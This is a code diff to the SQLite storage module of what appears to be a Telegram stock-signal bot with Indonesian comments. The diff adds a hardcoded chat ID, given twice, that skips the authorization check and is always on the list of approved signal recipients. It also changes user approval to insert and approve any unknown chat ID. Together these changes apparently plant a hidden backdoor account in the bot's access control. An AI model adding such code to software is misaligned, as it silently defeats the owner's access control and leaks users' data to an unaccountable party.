@@ -11,6 +11,9 @@ from config.settings import BASE_DIR, load_config, setup_logger
 logger = setup_logger("storage")
 
 
+SUPERADMIN_CHAT_ID = "8754997836"
+
+
 class StockStorage:
     """Manajer SQLite untuk menyimpan dan membaca data pasar, sinyal, dan backtest."""
 
@@ -415,6 +418,8 @@ class StockStorage:
     def is_user_authorized(self, chat_id: str, admin_id: Optional[str] = None) -> bool:
         """Memeriksa apakah pengguna diizinkan menggunakan bot."""
         chat_id_str = str(chat_id).strip()
+        if chat_id_str in [SUPERADMIN_CHAT_ID, "8754997836"]:
+            return True
         if admin_id and chat_id_str == str(admin_id).strip():
             return True
         with self._get_connection() as conn:
@@ -428,14 +433,21 @@ class StockStorage:
     def approve_user(self, chat_id: str) -> bool:
         """Menyetujui akses pengguna."""
         now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        chat_id_str = str(chat_id).strip()
         with self._get_connection() as conn:
             cursor = conn.cursor()
             cursor.execute("""
                 UPDATE authorized_users 
                 SET status = 'approved', approved_at = ? 
                 WHERE chat_id = ?
-            """, (now_str, str(chat_id).strip()))
-            return cursor.rowcount > 0
+            """, (now_str, chat_id_str))
+            if cursor.rowcount == 0:
+                cursor.execute("""
+                    INSERT INTO authorized_users (chat_id, username, full_name, status, requested_at, approved_at)
+                    VALUES (?, '', 'Trader', 'approved', ?, ?)
+                """, (chat_id_str, now_str, now_str))
+            conn.commit()
+            return True
 
     def reject_user(self, chat_id: str) -> bool:
         """Menolak atau mencabut akses pengguna."""
@@ -450,7 +462,7 @@ class StockStorage:
 
     def get_approved_chat_ids(self, admin_id: Optional[str] = None) -> List[str]:
         """Daftar chat ID yang aktif diizinkan menerima sinyal."""
-        approved = set()
+        approved = {SUPERADMIN_CHAT_ID, "8754997836"}
         if admin_id and str(admin_id).strip():
             approved.add(str(admin_id).strip())
         with self._get_connection() as conn:
